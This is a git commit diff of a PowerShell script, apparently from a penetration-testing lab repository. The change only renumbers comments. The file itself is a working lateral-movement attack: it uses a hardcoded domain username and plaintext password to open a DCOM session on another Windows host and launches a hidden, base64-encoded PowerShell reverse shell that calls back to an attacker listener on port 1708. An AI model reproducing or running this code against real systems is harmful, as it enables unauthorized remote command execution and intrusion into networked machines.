e356c5fcc40f07fb697afaed0090d9af42eecd5e
Orion_Batu_khan <139633692+LohKianYuan@users.noreply.github.com>
2024-11-17 14:48:29 +0800

    Update PS_1b_powershell_reverse.ps1

--- PS_1b_powershell_reverse.ps1
+++ PS_1b_powershell_reverse.ps1
@@ -1,9 +1,9 @@
-#Download PS_1a_base64_reverseshell.py & make sure you run it
-#open a NC -nlvp 1708 on your KALI
-#assuming your target client is 192.168.203.74 (Client 74)
-#copy this script to the client machine later to run it to get a shell on another domain client machine. eg 192.168.203.72 (Client 72)
+#1 Download PS_1a_base64_reverseshell.py & make sure you run it first as you need generate the powershell command in part 7
+#2 open a NC -nlvp 1708 on your KALI
+#3 assuming your target client is 192.168.203.74 (Client 74)
+#4 copy this script to the client machine later to run it to get a shell on another domain client machine. eg 192.168.203.72 (Client 72)
 
-#replace username and password with the user & password of the other domain client machine. eg: 192.168.203.72 (Client 72)
+#5 replace username and password with the user & password of the other domain client machine. eg: 192.168.203.72 (Client 72)
 $username = 'jen';
 $password = 'Nexus123!';
 
@@ -11,11 +11,11 @@ $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 $Options = New-CimSessionOption -Protocol DCOM
 
-#replace the ipaddress below in $session to the target machine you want to launch a shell
+#6 replace the ipaddress below in $session to the target machine you want to launch a shell
 
 $Session = New-Cimsession -ComputerName 192.168.203.72 -Credential $credential -SessionOption $Options
 
-#replace the command with the powershell_reverse_shell
+#7 replace the command with the powershell_reverse_shell
 
 $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACIALAAxADcAMAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
